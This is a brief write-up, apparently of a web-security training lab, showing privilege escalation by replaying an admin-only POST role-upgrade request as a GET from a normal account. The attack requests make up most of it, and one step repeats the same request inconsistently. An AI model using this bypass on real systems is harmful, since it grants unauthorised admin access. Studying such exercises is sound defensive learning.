Method-based access control bypass

Logged in as admin to observe role upgrade functionality:

POST /admin-roles
username=carlos&action=upgrade

Then switched to normal user and changed request method to GET:

GET /admin-roles?username=wiener&action=upgrade

Backend failed to enforce proper method validation and initially rejected missing parameters.

Final bypass:

GET /admin-roles?username=wiener&action=upgrade

This successfully promoted the user to administrator.
